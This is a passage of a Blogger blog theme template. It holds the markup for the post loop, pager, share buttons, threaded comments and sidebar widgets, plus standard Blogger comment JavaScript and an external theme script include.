                                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                                  <a href='javascript:void(0);'>
                                    <data:shareMsg/>
                                  </a>
                                </div>
                              </b:if>
                              <b:if cond='data:top.showDummy'>
                                <div class='goog-inline-block dummy-container'>
                                  <data:post.dummyTag/>
                                </div>
                              </b:if>
                            </div>
                          </div>
                        </article>
                        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                          <b:include data='post' name='comment_picker'/>
                        </b:if>
                        <b:if cond='data:blog.pageType == &quot;item&quot;'>
                          <b:include data='post' name='comment_picker'/>
                        </b:if>
                      </div>
                    </div>
                  </div>
                </b:includable>
                <b:includable id='nextprev'>
                <div class='row'>
                  <div class='col s12 m12 l12'>
                    <div class='blog-pager' id='blog-pager'>
                      <b:if cond='data:newerPageUrl'>
                        <span id='blog-pager-newer-link'>
                          <a class='blog-pager-newer-link btn btn-danger waves-effect waves-cyan cyan' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'> 
                            <i class='fa fa-long-arrow-left'/>
                          </a>
                        </span>
                      </b:if>
                     <!--<b:if cond='data:blog.pageType != &quot;item&quot;'>
                        <a class='home-link btn btn-danger waves-effect waves-cyan cyan' expr:href='data:blog.homepageUrl'>
                          <i class='fa fa-home'/>
                        </a>
                      </b:if>-->
                      <b:if cond='data:olderPageUrl'>
                        <span id='blog-pager-older-link'> 
                          <a class='blog-pager-older-link btn btn-danger waves-effect waves-cyan cyan' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>
                           <i class='fa fa-long-arrow-right'/>
                          </a>
                        </span>
                      </b:if>
                      <b:if cond='data:mobileLinkUrl'>
                        <div class='blog-mobile-link'>
                          <a expr:href='data:mobileLinkUrl'>
                            <data:mobileLinkMsg/>
                          </a>
                        </div>
                      </b:if>
                    </div>
                  </div>
                </div>
                <div class='clear'/>
              </b:includable>
                <b:includable id='post' var='post'>
                  <b:if cond='data:blog.pageType == &quot;index&quot;'>
           
                    <div class='post-start md-card' expr:id='&quot;post_po_summary&quot; + data:post.id'>
                      <div class='home-post-single'>
                        <h2 class='post-home-title post-main-home-title' itemprop='headline'>
                        
                        <b:if cond='data:post.link'>
                          <a expr:href='data:post.link' expr:title='data:post.title'>
                            <data:post.title/>
                          </a>
                          <b:else/>
                          <b:if cond='data:post.url'>
                            <a expr:href='data:post.url' expr:title='data:post.title'>
                              <data:post.title/>
                            </a>
                            <b:else/>
                            <data:post.title/>
                          </b:if>
                        </b:if>
                      </h2>
                      <div class='post-header'>

                              <div class='home-post-above'>
                                <span class='post-labels'>
                                  <b:if cond='data:post.labels'> 
                                    <b:loop values='data:post.labels' var='label'>
                                       <a class='btn white waves-effect waves-cyan' expr:href='data:label.url' rel='tag'>
                                        <data:label.name/>
                                      </a>
                                      <b:if cond='data:label.isLast != &quot;true&quot;'> 
                                      </b:if>
                                    </b:loop>
                                  </b:if>
                                </span>
                              </div>
                        
                              <span class='post-author vcard'>
                                <b:if cond='data:top.showAuthor'>
                                  <i class='fa fa-user'/>&#160; Author : <span class='fn'><data:post.author/></span>
                                </b:if>
                              </span>

                              
                              <span class='post-timestamp' itemprop='dateModified'>
                  <b:if cond='data:top.showTimestamp'>
                                    <i class='fa fa-calendar'/>&#160;
                                    <b:if cond='data:post.url'>
                                      <a class='updated' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                                          <abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'>
                                              <data:post.timestamp/>
                                          </abbr>
                                      </a>
                                    </b:if>
                                  </b:if>
                              </span>

                              <span class='post-comment-link'>
                                <b:if cond='data:post.allowComments'>
                                    <i class='fa fa-comments'/>&#160;
                                <b:include data='post' name='comment_count_picker'/>
                                </b:if>
                              </span>
                         
                      </div>
                      <div class='homapge-thumb'>
                        <article class='post hentry' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'> 

                          <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                              <abbr class='published gv' expr:content='data:post.timestampISO8601' itemprop='datePublished dateModified'>
                                  <span class='updated'>
                                      <data:post.dateheader/> 
                                      <data:post.timestamp/>
                                  </span>
                              </abbr>
                          </a>
                        <div itemprop='mainEntityOfPage' itemscope='itemscope' itemtype='https://schema.org/WebPage'>
                        </div>
                        <div itemprop='publisher' itemscope='itemscope' itemtype='https://schema.org/Organization'>
                            <div itemprop='logo' itemscope='itemscope' itemtype='https://schema.org/ImageObject'>
                                <meta content='https://2.bp.blogspot.com/-yrRz2QGziT4/Vsdxv3tskkI/AAAAAAAABbY/eQh_cyvqKVg/s1600/logo%2Bbeta.png' itemprop='url'/>
                                <meta content='600' itemprop='width'/>
                                <meta content='600' itemprop='height'/>
                            </div>
                            <meta expr:content='data:blog.title' itemprop='name'/>
                        </div>
 
                            <meta expr:content='data:post.title' itemprop='headline'/>


                        <div itemType='https://schema.org/WebPage' itemprop='mainEntityOfPage' itemscope='itemscope'/>
                        <div itemprop='image' itemscope='itemscope' itemtype='https://schema.org/ImageObject'>

                              <b:if cond='data:post.firstImageUrl'>
                                <meta expr:content='data:post.firstImageUrl' itemprop='url'/>
                                <meta content='100%' itemprop='width'/>
                                <meta content='100%' itemprop='height'/>
                              </b:if> 
                        </div>

                          <b:if cond='data:post.title'>
                          </b:if>
                          <div expr:id='&quot;summary&quot; + data:post.id'>

                             <!-- Read more -->
                            
                            
                             <b:if cond='data:blog.pageType != &quot;item&quot;'>
                              <div expr:id='&quot;summary&quot; + data:post.id'><p><data:post.body/></p>
<!-- hCard"author" Start --> <span class='post-author vcard'> <b:if cond='data:top.showAuthor'> <data:top.authorLabel/> <b:if cond='data:post.authorProfileUrl'> <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'> <meta expr:content='data:post.authorProfileUrl' itemprop='url'/> <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'> <span itemprop='name'><data:post.author/></span> </a> </span> <b:else/> <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'> <span itemprop='name'><data:post.author/></span> </span> </b:if> </b:if> </span> <!-- hCard"author" End --></div> 
                             </b:if>
                                        
                          </div> 
                          <script type='text/javascript'>
                            createSummaryAndThumb(&quot;summary<data:post.id/>&quot;,&quot;<data:post.url/>&quot;);
                          </script>
                              <span class='rmlink' style='display:block;'>
                              <a class='waves-effect' expr:href='data:post.url'>Read More</a></span>
                        </article>
                      </div>
                      </div>
                    </div>
                    <b:else/>

          <!--
            <b:if cond='data:post.firstImageUrl'>
                          <img expr:src='data:post.firstImageUrl'/>
                        </b:if>
          --> 

                    <div class='post-single-outer card-panel'>
                      <article class='post hentry' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
                         <div itemprop='mainEntityOfPage' itemscope='itemscope' itemtype='https://schema.org/WebPage'>
                        </div>
                        <div itemprop='publisher' itemscope='itemscope' itemtype='https://schema.org/Organization'>
                            <div itemprop='logo' itemscope='itemscope' itemtype='https://schema.org/ImageObject'>
                                <meta content='https://2.bp.blogspot.com/-yrRz2QGziT4/Vsdxv3tskkI/AAAAAAAABbY/eQh_cyvqKVg/s1600/logo%2Bbeta.png' itemprop='url'/>
                                <meta content='600' itemprop='width'/>
                                <meta content='600' itemprop='height'/>
                            </div>
                            <meta expr:content='data:blog.title' itemprop='name'/>
                        </div>
                        <b:if cond='data:post.firstImageUrl'>
                          <meta expr:content='data:post.firstImageUrl' itemprop='image'/>
                        </b:if> 
                        <a expr:name='data:post.id'/>
                        <b:if cond='data:post.title'>
                          <b:if cond='data:post.link'>
                            <a expr:href='data:post.link'>
                              <data:post.title/>
                            </a>
                            <b:else/>
                            <b:if cond='data:post.url'>
                              <b:if cond='data:blog.url != data:post.url'>
                                <h2 class='post-title entry-title' itemprop='headline'>
                                  <a expr:href='data:post.url'>
                                    <data:post.title/>
                                  </a>
                                </h2>
                                <b:else/>
                                <h1 class='post-title entry-title' itemprop='headline'>
                                  <data:post.title/>
                                </h1>
                              </b:if>
                              <b:else/>
                              <data:post.title/>
                            </b:if>
                          </b:if>
                        </b:if>
                        <div class='post-header'>
                          <div class='post-header-line-1'/>
                          
                               <span class='post-labels'>
                                <b:if cond='data:post.labels'> 
                                  <b:loop values='data:post.labels' var='label'>
                                     <a expr:href='data:label.url' rel='tag'>
                                      <data:label.name/>
                                    </a>
                                    <b:if cond='data:label.isLast != &quot;true&quot;'> 
                                    </b:if>
                                  </b:loop>
                                </b:if>
                              </span>
 
                            <span class='post-author vcard'>
                               <b:if cond='data:top.showAuthor'>
                                <span class='vcard' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                    <span class='fn'> 
                                      <i class='fa fa-user'/>&#160; <span itemprop='name'><data:post.author/></span>
                                    </span>
                                </span>
                               </b:if>
                            </span>  

                              <span class='post-timestamp' itemprop='dateModified'>
                  <b:if cond='data:top.showTimestamp'>
                                    <i class='fa fa-calendar'/>&#160;
                                    <b:if cond='data:post.url'>
                                      <a class='updated' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                                          <abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'>
                                              <data:post.timestamp/>
                                          </abbr>
                                      </a>
                                    </b:if>
                                  </b:if>
                              </span>
 

                              <span class='post-comment-link'>
                                <b:if cond='data:post.allowComments'>
                                    <i class='fa fa-comments'/>&#160;
                                <b:include data='post' name='comment_count_picker'/>
                                </b:if>
                              </span>
                        </div>
                        <div class='main-content-body'> 
                          <data:post.body/>   
                        </div>
                        <!-- Social medias-->
                        <div class='row btn-sharing-container'>
                          <ul class='btn-sharing-list'>
                            <li>

                              <a class='btn share-facebook blue' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;t=&quot; + data:post.title' target='_blank' title='Share on facebook'>
                                <i class='fa fa-facebook'> 
                                </i>
                              </a>
                            </li>
                            <li>
                              <a class='btn share-twitter cyan' expr:href='&quot;http://twitter.com/intent/tweet?text=&quot; + data:post.title + &quot;&amp;url=&quot; + data:post.url' target='_blank' title='Share on Twitter'>
                                <i class='fa fa-twitter'>
                                </i>
                              </a>
                            </li>
                            <li>
                              <a class='btn share-google-plus red' expr:href='&quot;https://plus.google.com/share?url=&quot; + data:post.url' rel='nofollow' target='_blank'><i class='fa fa-google-plus'>
                                </i>
                			 </a>
                            </li>
                            <li>
                              <a class='btn share-pinterest red darken-2' expr:href='&quot;http://pinterest.com/pin/create/button/?url=&quot; + data:post.url' rel='nofollow' target='_blank'><i class='fa fa-pinterest'>
                                </i>
                			 </a>
                            </li>
                            <li>
                              <a class='btn share-linkedin blue darken-2' expr:href='&quot;http://www.linkedin.com/shareArticle?mini=true&amp;url=&quot; + data:post.url' rel='nofollow' target='_blank'><i class='fa fa-linkedin'>
                                </i>
                			 </a>
                            </li> 
                          </ul>
                        </div>
            <b:if cond='data:blog.pageType == &quot;item&quot;'> 
                         

                        </b:if>
                        <!-- end social medias --> 
                        <b:if cond='data:blog.pageType == &quot;item&quot;'>
                          <!-- navigation -->
 <b:if cond='data:blog.pageType == &quot;item&quot;'>
    <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
        <div class='row'>
            <div class='col s12 m6 previous'>

                <b:if cond='data:olderPageUrl'>
                    <div class='card'>
                        <div class='card-content white-text grey lighten-4'>
                            <span>
                                <a class='older-link grey-text text-darken-2' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;'>
                                </a>
                            </span>
                        </div>
                    </div>
                    <b:else>
                    </b:else>
                    
                </b:if> 
            </div>
            <div class='col s12 m6 next'>
                <b:if cond='data:newerPageUrl'>
                    <div class='card'>
                        <div class='card-content white-text grey lighten-4'>
                            <span>
                                <a class='newer-link grey-text text-darken-2' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;'>
                                </a>
                            </span>
                        </div>
                    </div>
                    <b:else>
                    </b:else>
                    
                </b:if>
            </div>
        </div>
        <script type='text/javascript'>
            //<![CDATA[ 
		(function($){    
		    var newerLink = $('a.newer-link'); 
		    var olderLink = $('a.older-link'); 
		    $.get(newerLink.attr('href'), function (data) { 
		     newerLink.html('<span class=\'btn btn-floating grey right\' style=\'margin-left: 20px\'><i class=\'fa fa-angle-right\'/></span> <span>'+$(data).find('.post-title').text()+'</span>');    
		    },"html"); 
		    $.get(olderLink.attr('href'), function (data2) { 
		     olderLink.html('<span class=\'btn btn-floating grey left\' style=\'margin-right: 20px\'><i class=\'fa fa-angle-left\'/></span> <span>'+$(data2).find('.post-title').text()+'</span>');    
		    },"html"); 
		})(jQuery); 
		//]]>
        </script>
    </b:if>
</b:if>
                        </b:if>
                        <div class='post-footer'>
                        <!-- Related Posts with Thumbnails Code Start-->
                        <b:if cond='data:blog.pageType == &quot;item&quot;'>
                        <div id='related-posts'>

                            <b:loop values='data:post.labels' var='label'>
                            <b:if cond='data:label.isLast != &quot;true&quot;'>
                            </b:if>
                            <script expr:src='&quot;/feeds/posts/default/-/&quot; + data:label.name + &quot;?alt=json-in-script&amp;callback=related_results_labels_thumbs&amp;max-results=3&quot;' type='text/javascript'/>
                            </b:loop>

                        <script type='text/javascript'>
                        var currentposturl=&quot;<data:post.url/>&quot;;
                        var maxresults=3;
                        var relatedpoststitle=&quot;<b>Related Posts:</b>&quot;;
                        removeRelatedDuplicates_thumbs();
                        printRelatedLabels_thumbs();
                        </script>
                          <div class='clear'/>
                        </div> 

                        </b:if>

                        <!-- Related Posts with Thumbnails Code End-->
                          <div class='post-footer-line post-footer-line-1'>
                            <span class='post-icons'>
                              <!-- email post links -->
                              <b:if cond='data:post.emailPostUrl'>
                                <span class='item-action'>
                                  <a expr:href='data:post.emailPostUrl' expr:title='data:top.emailPostMsg'>
                                    <img alt='' class='icon-action' height='13' src='http://img1.blogblog.com/img/icon18_email.gif' width='18'/>
                                  </a>
                                </span>
                              </b:if> 
                            </span>
                          </div>
                        </div>
                      </article>
                    </div>
                  </b:if>
                </b:includable>
                <b:includable id='postQuickEdit' var='post'>
                  <b:if cond='data:post.editUrl'>
                    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
                      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
                        <img alt='' class='icon-action' height='18' src='http://img2.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
                      </a>
                    </span>
                  </b:if>
                </b:includable>
                <b:includable id='shareButtons' var='post'>
                  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showOrkutButton'><a class='goog-inline-block share-button sb-orkut' expr:href='data:post.sharePostUrl + &quot;&amp;target=orkut&quot;' expr:title='data:top.shareToOrkutMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToOrkutMsg/></span></a></b:if><b:if cond='data:top.showPinterestButton'><a class='goog-inline-block share-button sb-pinterest' expr:href='data:post.sharePostUrl + &quot;&amp;target=pinterest&quot;' expr:title='data:top.shareToPinterestMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToPinterestMsg/></span></a></b:if><b:if cond='data:top.showDummy'><div class='goog-inline-block dummy-container'><data:post.dummyTag/></div></b:if>
                </b:includable>
                <b:includable id='status-message'>
                  <b:if cond='data:navMessage'>
                    <div class='status-msg-wrap'>
                      <div class='status-msg-body red white-text card'>
                        <data:navMessage/>
                      </div>
                    </div>
                    <div style='clear: both;'/>
                  </b:if>
                </b:includable>
                <b:includable id='threaded-comment-form' var='post'>
                    <div class='comment-form'>
                      <a name='comment-form'/>
                      <b:if cond='data:mobile'>
                        <p>
                          <data:blogCommentMessage/>
                        </p>
                        <data:blogTeamBlogMessage/>
                        <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                        <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
                        <b:else/>
                        <p>
                          <data:blogCommentMessage/>
                        </p>
                        <data:blogTeamBlogMessage/>
                        <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                        <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
                      </b:if>
                      <data:post.friendConnectJs/>
                      <data:post.cmtfpIframe/>
                      <script type='text/javascript'>
                        BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
                      </script>
                    </div>
                  </b:includable>
                <b:includable id='threaded_comment_js' var='post'>
                    <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>
                    <script type='text/javascript'>
                      (function() {
                        var items = <data:post.commentJso/>;
                        var msgs = <data:post.commentMsgs/>;
                        var config = <data:post.commentConfig/>;
                        // <![CDATA[
                        var cursor = null;
                        if (items && items.length > 0) {
                          cursor = parseInt(items[items.length - 1].timestamp) + 1;
                        }
                        var bodyFromEntry = function(entry) {
                          if (entry.gd$extendedProperty) {
                            for (var k in entry.gd$extendedProperty) {
                              if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
                                return '<span class="deleted-comment">' + entry.content.$t + '</span>';
                              }
                            }
                          }
                          return entry.content.$t;
                        }
                        var parse = function(data) {
                          cursor = null;
                          var comments = [];
                          if (data && data.feed && data.feed.entry) {
                            for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
                              var comment = {};
                              // comment ID, parsed out of the original id format
                              var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
                              comment.id = id ? id[2] : null;
                              comment.body = bodyFromEntry(entry);
                              comment.timestamp = Date.parse(entry.published.$t) + '';
                              if (entry.author && entry.author.constructor === Array) {
                                var auth = entry.author[0];
                                if (auth) {
                                  comment.author = {
                                    name: (auth.name ? auth.name.$t : undefined),
                                    profileUrl: (auth.uri ? auth.uri.$t : undefined),
                                    avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                                  };
                                }
                              }
                              if (entry.link) {
                                if (entry.link[2]) {
                                  comment.link = comment.permalink = entry.link[2].href;
                                }
                                if (entry.link[3]) {
                                  var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                                  if (pid && pid[1]) {
                                    comment.parentId = pid[1];
                                  }
                                }
                              }
                              comment.deleteclass = 'item-control blog-admin';
                              if (entry.gd$extendedProperty) {
                                for (var k in entry.gd$extendedProperty) {
                                  if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                                    comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                                  } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                                    comment.displayTime = entry.gd$extendedProperty[k].value;
                                  }
                                }
                              }
                              comments.push(comment);
                            }
                          }
                          return comments;
                        };
                        var paginator = function(callback) {
                          if (hasMore()) {
                            var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
                            if (cursor) {
                              url += '&published-min=' + new Date(cursor).toISOString();
                            }
                            window.bloggercomments = function(data) {
                              var parsed = parse(data);
                              cursor = parsed.length < 50 ? null
                              : parseInt(parsed[parsed.length - 1].timestamp) + 1
                              callback(parsed);
                              window.bloggercomments = null;
                            }
                            url += '&callback=bloggercomments';
                            var script = document.createElement('script');
                            script.type = 'text/javascript';
                            script.src = url;
                            document.getElementsByTagName('head')[0].appendChild(script);
                          }
                        };
                        var hasMore = function() {
                          return !!cursor;
                        };
                        var getMeta = function(key, comment) {
                          if ('iswriter' == key) {
                            var matches = !!comment.author
                            && comment.author.name == config.authorName
                            && comment.author.profileUrl == config.authorUrl;
                            return matches ? 'true' : '';
                          } else if ('deletelink' == key) {
                            return config.baseUri + '/delete-comment.g?blogID='
                            + config.blogId + '&postID=' + comment.id;
                          } else if ('deleteclass' == key) {
                            return comment.deleteclass;
                          }
                          return '';
                        };
                        var replybox = null;
                        var replyUrlParts = null;
                        var replyParent = undefined;
                        var onReply = function(commentId, domId) {
                          if (replybox == null) {
                            // lazily cache replybox, and adjust to suit this style:
                            replybox = document.getElementById('comment-editor');
                            if (replybox != null) {
                              replybox.height = '250px';
                              replybox.style.display = 'block';
                              replyUrlParts = replybox.src.split('#');
                            }
                          }
                          if (replybox && (commentId !== replyParent)) {
                            document.getElementById(domId).insertBefore(replybox, null);
                            replybox.src = replyUrlParts[0]
                            + (commentId ? '&parentID=' + commentId : '')
                            + '#' + replyUrlParts[1];
                            replyParent = commentId;
                          }
                        };
                        var hash = (window.location.hash || '#').substring(1);
                        var startThread, targetComment;
                        if (/^comment-form_/.test(hash)) {
                          startThread = hash.substring('comment-form_'.length);
                        } else if (/^c[0-9]+$/.test(hash)) {
                          targetComment = hash.substring(1);
                        }
                        // Configure commenting API:
                        var configJso = {
                          'maxDepth': config.maxThreadDepth
                        };
                        var provider = {
                          'id': config.postId,
                          'data': items,
                          'loadNext': paginator,
                          'hasMore': hasMore,
                          'getMeta': getMeta,
                          'onReply': onReply,
                          'rendered': true,
                          'initComment': targetComment,
                          'initReplyThread': startThread,
                          'config': configJso,
                          'messages': msgs
                        };
                        var render = function() {
                          if (window.goog && window.goog.comments) {
                            var holder = document.getElementById('comment-holder');
                            window.goog.comments.render(holder, provider);
                          }
                        };
                        // render now, or queue to render when library loads:
                        if (window.goog && window.goog.comments) {
                          render();
                        } else {
                          window.goog = window.goog || {};
                          window.goog.comments = window.goog.comments || {};
                          window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
                          window.goog.comments.loadQueue.push(render);
                        }
                      })();
                      // ]]>
                    </script>
                  </b:includable>
                <b:includable id='threaded_comments' var='post'>
                    <div class='comments card-panel' id='comments'>
                      <a name='comments'/>
                      <h4>
                        <data:post.commentLabelFull/>
                        :
                      </h4>
                      <div class='comments-content'>
                        <b:if cond='data:post.embedCommentForm'>
                          <b:include data='post' name='threaded_comment_js'/>
                        </b:if>
                        <div id='comment-holder'>
                          <data:post.commentHtml/>
                        </div>
                      </div>
                      <p class='comment-footer'>
                        <b:if cond='data:post.allowNewComments'>
                          <b:include data='post' name='threaded-comment-form'/>
                          <b:else/>
                          <data:post.noNewCommentsText/>
                        </b:if>
                      </p>
                      <b:if cond='data:showCmtPopup'>
                        <div id='comment-popup'>
                          <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
                          </iframe>
                        </div>
                      </b:if>
                      <div id='backlinks-container'>
                        <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
                          <b:if cond='data:post.showBacklinks'>
                            <b:include data='post' name='backlinks'/>
                          </b:if>
                        </div>
                      </div>
                    </div>
                  </b:includable>
              </b:widget>
            </b:section>
            <!-- END Loop -->
          </div>
          <!-- END Content -->
          <div class='col s12 m12 l4 hide-home-sidebar'>
              <div class='sidebox'>

                <div class='banner-ads banner-sidebar' id='banner-sidebar'>
                  <!-- YOUR ADS CODE --> 
                </div> 

                <b:section class='sidebar' id='sidebar' preferred='yes'>
                   <b:widget id='PopularPosts1' locked='false' title='Popular Posts' type='PopularPosts' version='1' visible='true'>
                     <b:includable id='main'>
    <b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
    <div class='widget-content popular-posts'>
      <ul class='collection'>
        <b:loop values='data:posts' var='post'>
        <li class='collection-item avatar'>
          <b:if cond='!data:showThumbnails'>
            <b:if cond='!data:showSnippets'>
              <!-- (1) No snippet/thumbnail -->
              <a expr:href='data:post.href'><data:post.title/></a>
            <b:else/>
              <!-- (2) Show only snippets -->
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
              <div class='item-snippet'><data:post.snippet/></div>
            </b:if>
          <b:else/>
            <!-- (3) Show only thumbnails or (4) Snippets and thumbnails. -->
            <div expr:class='data:showSnippets ? &quot;item-content&quot; : &quot;item-thumbnail-only&quot;'>
              <b:if cond='data:post.thumbnail'> 
                  <a expr:href='data:post.href' target='_blank'>
                    <img border='0' class='circle' expr:alt='data:post.title' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:title='data:post.title' expr:width='data:thumbnailSize'/>
                  </a> 
              </b:if>
              <span class='title'><a expr:href='data:post.href'><data:post.title/></a></span>
              <b:if cond='data:showSnippets'>
                <div class='item-snippet'><data:post.snippet/></div>
              </b:if>
            </div>
            <div style='clear: both;'/>
          </b:if>
        </li>
        </b:loop>
      </ul> 
    </div>
  </b:includable>
                   </b:widget>
                   <b:widget id='Label5' locked='false' title='Category' type='Label' version='1' visible='true'>
                     <b:includable id='main'>
    <b:if cond='data:title != &quot;&quot;'>
      <h2><data:title/></h2>
    </b:if>
    <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
      <b:if cond='data:display == &quot;list&quot;'>
        <ul>
          <b:loop values='data:labels' var='label'>
            <li>
              <b:if cond='data:blog.url == data:label.url'>
                <span class='blog-pager-older-link btn btn-danger waves-effect waves-light red' expr:dir='data:blog.languageDirection'><data:label.name/></span>
              <b:else/>
                <a class='blog-pager-older-link btn btn-danger waves-effect waves-cyan cyan' expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
              </b:if>
              <b:if cond='data:showFreqNumbers'>
                <span class='z-depth-3' dir='ltr'><data:label.count/></span>
              </b:if>
            </li>
          </b:loop>
        </ul>
      <b:else/>
        <b:loop values='data:labels' var='label'>
          <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span class='label-count z-depth-3' dir='ltr'><data:label.count/></span>
            </b:if>
          </span>
        </b:loop>
      </b:if> 
    </div>
  </b:includable>
                   </b:widget>
                   <b:widget id='BlogArchive1' locked='false' title='Blog Archive' type='BlogArchive' visible='true'>
                     <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div class='widget-content'>
  <div id='ArchiveList'>
  <div expr:id='data:widget.instanceId + &quot;_ArchiveList&quot;'>
    <b:include cond='data:style == &quot;HIERARCHY&quot;' data='data' name='interval'/>
    <b:include cond='data:style == &quot;FLAT&quot;' data='data' name='flat'/>
    <b:include cond='data:style == &quot;MENU&quot;' data='data' name='menu'/>
  </div>
  </div>
  <b:include name='quickedit'/>
  </div>
</b:includable>
                     <b:includable id='flat' var='data'>
  <ul class='flat'>
    <b:loop values='data:data' var='i'>
      <li class='archivedate'>
        <a expr:href='data:i.url'><data:i.name/></a> (<data:i.post-count/>)
      </li>
    </b:loop>
  </ul>
</b:includable>
                     <b:includable id='interval' var='intervalData'>
  <b:loop values='data:intervalData' var='interval'>
    <ul class='hierarchy'>
      <li expr:class='&quot;archivedate &quot; + data:interval.expclass'>
        <b:include cond='data:interval.toggleId' data='interval' name='toggle'/>
        <a class='post-count-link' expr:href='data:interval.url'>
          <data:interval.name/>
        </a>
        <span class='post-count' dir='ltr'>(<data:interval.post-count/>)</span>
        <b:include cond='data:interval.data' data='interval.data' name='interval'/>
        <b:include cond='data:interval.posts' data='interval.posts' name='posts'/>
      </li>
    </ul>
  </b:loop>
</b:includable>
                     <b:includable id='menu' var='data'>
  <select expr:id='data:widget.instanceId + &quot;_ArchiveMenu&quot;'>
    <option value=''><data:title/></option>
    <b:loop values='data:data' var='i'>
      <option expr:value='data:i.url'><data:i.name/> (<data:i.post-count/>)</option>
    </b:loop>
  </select>
</b:includable>
                     <b:includable id='posts' var='posts'>
  <ul class='posts'>
    <b:loop values='data:posts' var='post'>
      <li><a expr:href='data:post.url'><data:post.title/></a></li>
    </b:loop>
  </ul>
</b:includable>
                     <b:includable id='toggle' var='interval'>
  <a class='toggle' href='javascript:void(0)'>
    <span expr:class='&quot;zippy&quot; + (data:interval.expclass == &quot;expanded&quot; ? &quot; toggle-open&quot; : &quot;&quot;)'>
      <b:if cond='data:interval.expclass == &quot;expanded&quot;'>
        &#9660;&#160;
      <b:elseif cond='data:blog.languageDirection == &quot;rtl&quot;'/>
        &#9668;&#160;
      <b:else/>
        &#9658;&#160;
      </b:if>
    </span>
  </a>
</b:includable>
                   </b:widget>
                 </b:section> 
              </div>
          </div>
          <!-- end sidebar widgets -->
        </div>
      </div>
      </div>
      <!-- END Container -->
    <script src='https://googledrive.com/host/0Bwg9nKxkueEjeDM5S2JRTHktUVk' type='text/javascript'/>  


